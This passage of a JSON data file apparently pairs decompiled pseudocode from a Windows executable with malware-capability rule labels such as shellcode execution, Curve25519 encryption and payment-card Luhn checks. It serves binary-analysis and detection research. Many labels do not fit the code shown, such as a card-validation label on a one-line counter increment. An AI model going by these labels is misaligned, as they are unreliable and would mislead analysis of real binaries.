        "decompiled_code": "\nvoid __fastcall fcn.0046f120(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x14);\n    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    *(*(in_EAX + 8) + iVar1) = param_2 >> 8;\n    iVar1 = *(in_EAX + 0x14);\n    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    *(*(in_EAX + 8) + iVar1) = param_2;\n    return;\n}\n",
        "token_count": 163
    },
    "004732cc": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004732cc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x16b8) < 0xe) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = arg_8h >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n    }\n    fcn.00473f30(1);\n    return;\n}\n",
        "token_count": 434
    },
    "00473e54": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00473e54(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x16b8) == 0x10) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = 0;\n        *(in_EAX + 0x16b8) = 0;\n        return;\n    }\n    if (7 < *(in_EAX + 0x16b8)) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -8;\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "0048d6d4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0048d6d4(void)\n\n{\n    uint8_t uVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x48d75a;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar2 = *0x497c6c == 0;\n    *0x497c6c = *0x497c6c + -1;\n    if (bVar2) {\n        uVar1 = sub.kernel32.dll_GetVersion();\n        *0x497c68 = 3 < uVar1;\n        fcn.0045da50();\n        fcn.004190c4();\n        fcn.00419164();\n        fcn.00419110();\n        fcn.00419110();\n        fcn.00419110();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 237
    },
    "004657d8": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004657d8(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((arg_8h & 0x4000000) != 0) {\n        uVar1 = 0x200;\n    }\n    if ((arg_8h & 0x20000000) == 0) {\n        if ((arg_8h & 0x40000000) == 0) {\n            if ((arg_8h & 0x80000000) == 0) {\n                uVar1 = uVar1 | 1;\n            }\n            else {\n                uVar1 = uVar1 | 8;\n            }\n        }\n        else if ((arg_8h & 0x80000000) == 0) {\n            uVar1 = uVar1 | 2;\n        }\n        else {\n            uVar1 = uVar1 | 4;\n        }\n    }\n    else if ((arg_8h & 0x40000000) == 0) {\n        if ((arg_8h & 0x80000000) == 0) {\n            uVar1 = uVar1 | 0x10;\n        }\n        else {\n            uVar1 = uVar1 | 0x80;\n        }\n    }\n    else if ((arg_8h & 0x80000000) == 0) {\n        uVar1 = uVar1 | 0x20;\n    }\n    else {\n        uVar1 = uVar1 | 0x40;\n    }\n    return uVar1;\n}\n",
        "token_count": 359
    },
    "00461fd4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00461fd4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x461feb;\n    fcn.004059cc();\n    uStack28 = 0x462040;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.0040a590();\n    fcn.00405584();\n    fcn.0040a67c();\n    fcn.00405584();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x462047;\n    uStack28 = 0x46203f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 202
    },
    "00462b0c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00462b0c(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = 0;\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    *(in_EAX + 0x1c) = 0;\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    *(in_EAX + 0x3c) = 0;\n    fcn.0040700c();\n    fcn.0040700c();\n    *(in_EAX + 0x48) = 0;\n    *(in_EAX + 0x4c) = 0;\n    fcn.00404620();\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00462be0();\n    *arg_8h = uVar1;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 402
    },
    "0047ea58": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0047ea58(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x47ea6a;\n    fcn.004059cc();\n    uStack20 = 0x47ea99;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405584();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x47eaa0;\n    uStack20 = 0x47ea98;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 168
    },
    "00487ab8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00487ab8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x487aca;\n    fcn.004059cc();\n    uStack20 = 0x487af9;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405584();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x487b00;\n    uStack20 = 0x487af8;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 165
    },
    "00433a5c": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: uCode\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00433a5c(void)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint lpString;\n    uint uCode;\n    \n    uCode._0_1_ = in_AL;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_MapVirtualKeyA(uCode, 0);\n    if (iVar1 << 0x10 != 0) {\n        sub.user32.dll_GetKeyNameTextA(iVar1 << 0x10, &lpString, 0x100);\n        fcn.004057a0();\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00464514": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464514(int32_t *param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iStack32;\n    uint8_t *puStack28;\n    uint8_t *puStack24;\n    int32_t iStack20;\n    \n    fcn.004643b4();\n    iStack20 = (**(*param_1 + 0x20))();\n    if (-1 < iStack20 + -1) {\n        iStack32 = 0;\n        puStack28 = param_2;\n        do {\n            puVar1 = fcn.00429aa0();\n            iVar2 = (**(*param_1 + 0x2c))();\n            iVar3 = (**(*param_1 + 0x20))();\n            iVar5 = iStack32;\n            if (iStack32 < 0) {\n                iVar5 = iStack32 + 3;\n            }\n            puVar6 = param_2 + iVar2 * (iVar3 + (iVar5 >> 2));\n            iVar5 = (**(*param_1 + 0x2c))();\n            iVar2 = (**(*param_1 + 0x20))();\n            iVar5 = iVar5 * iVar2;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + 3;\n            }\n            puStack24 = puVar6 + (iVar5 >> 2);\n            uVar4 = (**(*param_1 + 0x2c))();\n            iVar5 = uVar4 >> 1;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + ((uVar4 & 1) != 0);\n            }\n            if (-1 < iVar5 + -1) {\n                do {\n                    iVar2 = *(in_EAX + 0x4c + *puStack28 * 4);\n                    iVar3 = *(in_EAX + 0x84c + *puVar6 * 4) + iVar2;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    *puVar1 = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x44c + *puVar6 * 4) + iVar2 + *(in_EAX + 0x104c + *puStack24 * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[1] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar2 = iVar2 + *(in_EAX + 0xc4c + *puStack24 * 4);\n                    if (iVar2 < 0) {\n                        iVar2 = iVar2 + 0xff;\n                    }\n                    puVar1[2] = *(in_EAX + 0x184b + (iVar2 >> 8));\n                    iVar2 = *(in_EAX + 0x4c + puStack28[1] * 4);\n                    iVar3 = *(in_EAX + 0x84c + *puVar6 * 4) + iVar2;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[3] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x44c + *puVar6 * 4) + iVar2 + *(in_EAX + 0x104c + *puStack24 * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[4] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar2 = iVar2 + *(in_EAX + 0xc4c + *puStack24 * 4);\n                    if (iVar2 < 0) {\n                        iVar2 = iVar2 + 0xff;\n                    }\n                    puVar1[5] = *(in_EAX + 0x184b + (iVar2 >> 8));\n                    puVar1 = puVar1 + 6;\n                    puStack28 = puStack28 + 2;\n                    puVar6 = puVar6 + 1;\n                    puStack24 = puStack24 + 1;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            iStack32 = iStack32 + 1;\n            iStack20 = iStack20 + -1;\n        } while (iStack20 != 0);\n    }\n    return;\n}\n",
        "token_count": 1080
    },
    "0046470c": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046470c(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *extraout_var;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iStack20;\n    \n    fcn.004643b4();\n    piVar6 = extraout_var;\n    iStack20 = (**(*extraout_var + 0x20))();\n    if (-1 < iStack20 + -1) {\n        iVar7 = 0;\n        do {\n            puVar1 = fcn.00429aa0(piVar6, iVar7);\n            uVar2 = (**(*piVar6 + 0x2c))();\n            iVar5 = uVar2 >> 1;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + ((uVar2 & 1) != 0);\n            }\n            if (-1 < iVar5 + -1) {\n                do {\n                    iVar3 = *(in_EAX + 0x4c + *param_2 * 4);\n                    iVar4 = *(in_EAX + 0x84c + param_2[1] * 4) + iVar3;\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    *puVar1 = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar4 = *(in_EAX + 0x44c + param_2[1] * 4) + iVar3 + *(in_EAX + 0x104c + param_2[3] * 4);\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[1] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar3 = iVar3 + *(in_EAX + 0xc4c + param_2[3] * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[2] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x4c + param_2[2] * 4);\n                    iVar4 = *(in_EAX + 0x84c + param_2[1] * 4) + iVar3;\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[3] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar4 = *(in_EAX + 0x44c + param_2[1] * 4) + iVar3 + *(in_EAX + 0x104c + param_2[3] * 4);\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[4] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar3 = iVar3 + *(in_EAX + 0xc4c + param_2[3] * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[5] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    puVar1 = puVar1 + 6;\n                    param_2 = param_2 + 4;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            iVar7 = iVar7 + 1;\n            iStack20 = iStack20 + -1;\n        } while (iStack20 != 0);\n    }\n    return;\n}\n",
        "token_count": 894
    },
    "004070e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004070e0(int32_t arg_8h)\n\n{\n    sub.kernel32.dll_InterlockedIncrement(arg_8h + 4);\n    return;\n}\n",
        "token_count": 40
    },
    "004015a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015a0(int32_t param_1, int32_t param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    param_1 = param_1 + -0xc;\n    iVar2 = in_EAX + param_1;\n    param_2 = param_2 + param_1;\n    iVar3 = -param_1;\n    if (0 < param_1) {\n        do {\n            iVar1 = *(iVar3 + iVar2);\n            *(iVar3 + 8 + param_2) = ROUND(*(iVar3 + 8 + iVar2));\n            *(iVar3 + param_2) = ROUND(iVar1);\n            iVar3 = iVar3 + 0x10;\n        } while (iVar3 < 0);\n    }\n    *(iVar3 + param_2) = ROUND(*(iVar3 + iVar2));\n    *(iVar3 + 8 + param_2) = *(iVar3 + 8 + iVar2);\n    return;\n}\n",
        "token_count": 235
    },
    "0040248c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040248c(int32_t param_1, int32_t param_2)\n\n{\n    fcn.004030fc();\n    return param_2 + param_1;\n}\n",
        "token_count": 47
    },
    "00402520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402520(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    \n    if (((999 < in_EDX) || (cVar1 = fcn.004024a4(arg_8h),  cVar1 == '\\0')) ||\n       (cVar1 = fcn.004024a4(arg_8h),  cVar1 == '\\0')) {\n        return 0;\n    }\n    if ((in_EAX == *(in_EAX + -0x4c)) &&\n       ((*(in_EAX + -0x24) == 0 ||\n        ((cVar1 = fcn.004024a4(arg_8h),  cVar1 != '\\0' && (cVar1 = fcn.00402520(arg_8h),  cVar1 != '\\0')))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 211
    },
    "004025a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004025a0(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint uVar2;\n    uint var_10h;\n    \n    uVar2 = *in_EAX;\n    cVar1 = fcn.00402520(&stack0xfffffffc);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 94
    },
    "00402e04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402e04(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *0x49370c;\n    while (iVar1 != 0x493708) {\n        iVar1 = *(iVar1 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    iVar2 = 0x37;\n    iVar1 = 0x48f04c;\n    do {\n        *(iVar1 + 0x14) = iVar1;\n        *(iVar1 + 4) = iVar1;\n        *(iVar1 + 8) = 1;\n        *(iVar1 + 0xc) = 0;\n        iVar1 = iVar1 + 0x20;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *0x493708 = 0x493708;\n    *0x49370c = 0x493708;\n    iVar2 = 0x400;\n    iVar1 = 0x4937a8;\n    do {\n        *iVar1 = iVar1;\n        *(iVar1 + 4) = iVar1;\n        iVar1 = iVar1 + 8;\n        iVar2 = iVar2 + -1;\n        iVar3 = *0x4957b0;\n    } while (iVar2 != 0);\n    while (iVar3 != 0x4957ac) {\n        iVar3 = *(iVar3 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    *0x4957ac = 0x4957ac;\n    *0x4957b0 = 0x4957ac;\n    return;\n}\n",
        "token_count": 371
    },
    "00403098": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403098(int32_t param_1, int32_t param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    uVar1 = *in_EAX;\n    if (uVar1 == 0) {\n        *param_3 = 0;\n        return;\n    }\n    if (param_2 < 1) {\n        param_2 = 1;\ncode_r0x004030ae:\n        iVar2 = (uVar1 - param_2) + 1;\n        if (-1 < param_1) {\n            if (iVar2 < param_1) {\n                param_1 = iVar2;\n            }\n            goto code_r0x004030b9;\n        }\n    }\n    else if (param_2 <= uVar1) goto code_r0x004030ae;\n    param_1 = 0;\ncode_r0x004030b9:\n    *param_3 = param_1;\n    puVar3 = in_EAX + param_2;\n    for (; param_3 = param_3 + 1,  param_1 != 0; param_1 = param_1 + -1) {\n        *param_3 = *puVar3;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "004030fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.004030fc(uint32_t param_1, int64_t *param_2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    ushort uVar6;\n    uint uVar7;\n    int64_t *in_EAX;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int64_t *piVar11;\n    bool bVar12;\n    \n    if (in_EAX != param_2) {\n        if (0x20 < param_1) {\n            if (0x20 < param_1) {\n                if ((param_2 < in_EAX) ||\n                   (piVar11 = param_2 - param_1,  param_2 = param_1 + piVar11,  in_EAX <= piVar11)) {\n                    iVar2 = *in_EAX;\n                    piVar11 = (param_1 - 8) + in_EAX;\n                    piVar1 = param_2 + (param_1 - 8);\n                    iVar3 = *piVar11;\n                    iVar8 = ((param_2 & 0xfffffff8) + 8) - piVar1;\n                    do {\n                        *(iVar8 + piVar1) = ROUND(*(iVar8 + piVar11));\n                        bVar12 = SCARRY4(iVar8, 8);\n                        iVar8 = iVar8 + 8;\n                    } while (bVar12 != iVar8 < 0);\n                    *piVar1 = ROUND(iVar3);\n                    *param_2 = ROUND(iVar2);\n                    return;\n                }\n                iVar9 = param_1 - 8;\n                iVar2 = *(iVar9 + in_EAX);\n                iVar3 = *in_EAX;\n                iVar8 = (iVar9 + param_2 & 0xfffffff8U) - param_2;\n                do {\n                    *(iVar8 + param_2) = ROUND(*(iVar8 + in_EAX));\n                    iVar10 = iVar8 + -8;\n                    bVar12 = 7 < iVar8;\n                    iVar8 = iVar10;\n                } while (iVar10 != 0 && bVar12);\n                *param_2 = ROUND(iVar3);\n                *(iVar9 + param_2) = ROUND(iVar2);\n            }\n            return;\n        }\n        iVar8 = param_1 - 8;\n        if (iVar8 == 0 || param_1 < 8) {\n            switch(param_1) {\n            case 0:\n                goto code_r0x00403131;\n            case 1:\n                *param_2 = *in_EAX;\n                return;\n            case 2:\n                *param_2 = *in_EAX;\n                return;\n            case 3:\n                uVar5 = *(in_EAX + 2);\n                *param_2 = *in_EAX;\n                *(param_2 + 2) = uVar5;\n                return;\n            case 4:\n                *param_2 = *in_EAX;\n                return;\n            case 5:\n                uVar5 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar5;\n                return;\n            case 6:\n                uVar6 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar6;\n                return;\n            case 7:\n                uVar7 = *(in_EAX + 3);\n                *param_2 = *in_EAX;\n                *(param_2 + 3) = uVar7;\n                return;\n            case 8:\n                *param_2 = ROUND(*in_EAX);\n                return;\n            case 9:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xb:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xc:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xd:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xe:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            default:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x11:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x12:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x13:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x14:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x15:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        iVar2 = *(iVar8 + in_EAX);\n        iVar3 = *in_EAX;\n        if (8 < iVar8) {\n            iVar4 = in_EAX[1];\n            if (0x10 < iVar8) {\n                param_2[2] = ROUND(in_EAX[2]);\n            }\n            param_2[1] = ROUND(iVar4);\n        }\n        *param_2 = ROUND(iVar3);\n        *(iVar8 + param_2) = ROUND(iVar2);\n    }\ncode_r0x00403131:\n    return;\n}\n",
        "token_count": 1536
    },
    "004033b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004033b8(void)\n\n{\n    int32_t iVar1;\n    uchar auStack8 [8];\n    \n    iVar1 = sub.kernel32.dll_QueryPerformanceCounter();\n    if (iVar1 != 0) {\n        *0x48f008 = auStack8;\n        return;\n    }\n    *0x48f008 = sub.kernel32.dll_GetTickCount();\n    return;\n}\n",
        "token_count": 86
    },
    "00403970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403970(uint8_t param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    \n    uVar3 = *param_2;\n    uVar2 = *in_EAX + uVar3;\n    if (((!CARRY1(*in_EAX, uVar3)) && (uVar2 <= param_1)) ||\n       (uVar3 = param_1 - *in_EAX,  uVar2 = param_1,  *in_EAX <= param_1 && uVar3 != 0)) {\n        uVar1 = *in_EAX;\n        *in_EAX = uVar2;\n        puVar5 = param_2 + 1;\n        puVar6 = in_EAX + uVar1 + 1;\n        for (uVar4 = uVar3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "00403af4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
